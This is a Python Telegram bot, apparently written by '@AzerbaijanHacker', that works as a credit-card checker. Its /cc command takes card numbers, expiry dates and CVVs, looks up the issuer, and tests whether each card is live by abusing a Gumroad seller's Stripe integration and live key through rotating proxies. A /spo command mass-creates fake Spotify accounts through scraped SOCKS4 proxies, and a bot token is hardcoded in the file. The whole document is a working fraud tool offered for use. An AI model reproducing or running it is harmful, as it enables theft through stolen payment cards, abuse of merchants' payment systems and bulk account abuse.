from typing import Text
import telebot
import time
import requests
import json
import random
import string
import re
import platform
import random
import string
import threading
import time
from os import replace, system
from time import process_time
from fake_useragent import UserAgent
ua = UserAgent()
proxy = set()


with open("proxy.txt", "r") as f:
    file_lines1 = f.readlines()
    for line1 in file_lines1:
        proxy.add(line1.strip())
proxies = {'http':f"{random.choice(list(proxy))}", 'https':f"{random.choice(list(proxy))}"}



bot_token = '1983819285:AAEXPUnDzJsAxBKp0QZFltGBBnZGVgODcEE'
bot = telebot.TeleBot(token=bot_token)



@bot.message_handler(commands=['start'])
def send_welcome(message):
    bot.reply_to(message,'Salam')
@bot.message_handler(commands=['ip'])
def ip(message):
    try:
        proxies = {'http':f"{random.choice(list(proxy))}", 'https':f"{random.choice(list(proxy))}"}
        print(proxies)
        
        response=requests.get('http://ip-api.com/json/',proxies=proxies)
        ip = response.json()
        #print(ip)
        bot.reply_to(message, f'Status:✅\nCountry:{ip["country"]}\nRegion:{ip["region"]}\nIp Adress:{ip["query"]}')
       # print(ip["country"])
    except:
        bot.reply_to(message,'Ip  #DEAD ❌, Try Again')
#yoxlama
@bot.message_handler(commands=['cc'])
def hesab_axdar(message):
    proxies = {'http':f"{random.choice(list(proxy))}", 'https':f"{random.choice(list(proxy))}"}
    msg = bot.send_message(message.chat.id, "Karti Daxil Edin: ")
    bot.register_next_step_handler(msg, search)
        
def search(message):
        try:
            bot.send_message(message.chat.id, " Səbirli ol bro Çikliyirəm: ")
            list=message.text
            def pregs(list):
                arrays = re.findall(r'[0-9]+', list)
                return arrays
            #list
            arrs = pregs(list)
            cc = arrs[0]
            mm = arrs[1]
            yy = arrs[2]
            cvv = arrs [3]
            bin = requests.get("https://lookup.binlist.net/" + cc)
            colab = bin.json()
            cardlevel=colab['brand']
            cardbrend=colab['scheme']
            cardtype=colab['type']
            cardcountry=colab['country']['name']
            cardflag=colab['country']['emoji']
            

            url = 'https://api.stripe.com/v1/payment_methods'
            headers = {
                'user-agent': ua.ie
            }
            print(headers)

            data = {
                "type" : "card",
                "card[number]" : cc,
                "card[cvc]" : cvv,
                "card[exp_month]" : mm,
                "card[exp_year]" : yy,
                "pasted_fields" : "number",
                "payment_user_agent" : "stripe.js/cac019f9f; stripe-js-v3/cac019f9f",
                "referrer" : "https://codepalace.gumroad.com/",
                "key" : "pk_live_Db80xIzLPWhKo1byPrnERmym",
                "_stripe_version" : "2020-08-27"

            }

            with requests.Session() as session:
                post = session.post(url=url, headers=headers, data = data,proxies=proxies)

                headers = {
                    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
                }

                data = {
                    "stripe_payment_method_id" : post.json()["id"],
                    "card_country" : "AZ",
                    "card_country_source" : "stripe",
                }

                _post = session.post(url='https://codepalace.gumroad.com/stripe/setup_intents', headers=headers, data = data,proxies=proxies)

                load = _post.json()
               # print(load)
                user=message.__dict__["from_user"].first_name


                if load["success"] == True:
                    a=f'⫸Message: #LIVE ✅\n⫸CC:{cc}|{mm}|{yy}|{cvv}\n⫸Card Brand: {cardbrend}\n ⫸Card level : {cardlevel}\n ⫸Card type: {cardtype}\n ⫸Country: {cardcountry}{cardflag}\n⫸Checked:{user}\n⫸Coded:@AzerbaijanHacker'
                    # print(f'CC: {cc} Message: #LIVE ✅ - STRIPE AUTH Time: {fuck}')
                    print(message.text)
                    print(user)
                    bot.reply_to(message,a)
                else:
                    b=f'⫸Message: #DEAD ❌\n⫸CC: {cc}|{mm}|{yy}|{cvv}\n⫸Card Brand: {cardbrend}\n ⫸Card level : {cardlevel}\n ⫸Card type: {cardtype}\n ⫸Country: {cardcountry}{cardflag}\n⫸Error Code:{str(load["error_code"])}\n⫸Checked:{user}\n⫸Coded @AzerbaijanHacker'
                    bot.reply_to(message,b)
        except(IndexError):
            bot.reply_to(message,'CC düzgün daxil edin: ')
        except(json.decoder.JSONDecodeError):
            bot.reply_to(message,'CC Səhv daxil edilib cc|ay|il')
        except(KeyError):
            bot.reply_to(message,"Id çəkilmədi")
        except(TypeError):
            bot.reply_to(message,'Doğru daxil edin:')


#############################################################






@bot.message_handler(commands=['spo'])
def spo(message):
    if platform.system() == "Windows":  # checking OS
        title = "windows"
    else:
        title = "linux"

    def randomName(size=10, chars=string.ascii_letters + string.digits):
        return ''.join(random.choice(chars) for i in range(size))

    def randomPassword(size=14, chars=string.ascii_letters + string.digits):
        return ''.join(random.choice(chars) for i in range(size))



    global maxi
    global created

    created = 0
    errors = 0

    class proxy():
        def update(self):
            while True:


                data = ''
                urls = ["https://api.proxyscrape.com/?request=getproxies&proxytype=socks4&timeout=10000&ssl=yes"]
                for url in urls:
                    data += requests.get(url).text
                    self.splited += data.split("\r\n") #scraping and splitting proxies
                time.sleep(600)
        
        def get_proxy(self):
            random1 = random.choice(self.splited) #choose a random proxie
            return random1
        def FormatProxy(self):
            proxyOutput = {'https' :'socks4://'+self.get_proxy()}
            return proxyOutput

        def __init__(self):
            self.splited = []
            threading.Thread(target=self.update).start()
            time.sleep(3)

    proxy1 = proxy()

    def creator():
        global maxi
        global created
        global errors
        while maxi > created:
            if title == "windows":
                system("title "+ f"Spotify Account Creator by KevinLage https://github.com/KevinLage/Spotify-Account-Creator Created: {created}/{maxi}")
                
            s = requests.session()

            email = randomName()
            password = randomPassword()

            data={
            "displayname":"Josh",
            "creation_point":"https://login.app.spotify.com?utm_source=spotify&utm_medium=desktop-win32&utm_campaign=organic",
            "birth_month":"12",
            "email":email + "@gmail.com",
            "password":password,
            "creation_flow":"desktop",
            "platform":"desktop",
            "birth_year":"1991",
            "iagree":"1",
            "key":"4c7a36d5260abca4af282779720cf631",
            "birth_day":"17",
            "gender":"male",
            "password_repeat":password,
            "referrer":""
            }

            try:

                r = s.post("https://spclient.wg.spotify.com/signup/public/v1/account/",data=data,proxies=proxy1.FormatProxy())
                if '{"status":1,"' in r.text:
                    bot.reply_to(message,f'Account Info:{email}@gmail.com:{password} \n')
                    created += 1
                    if title == "windows":
                        system("title "+ f"Spotify Account Creator by KevinLage https://github.com/KevinLage/Spotify-Account-Creator Created: {created}/{maxi} Errors:{errors}")
                else:
                    errors += 1
            except:
                pass
     #   print("DONE")
    maxi = 1

    maxthreads = 2
    num = 0

    while num < maxthreads:
        num += 1
        threading.Thread(target=creator).start()  # Thread Ayarlari

bot.polling()
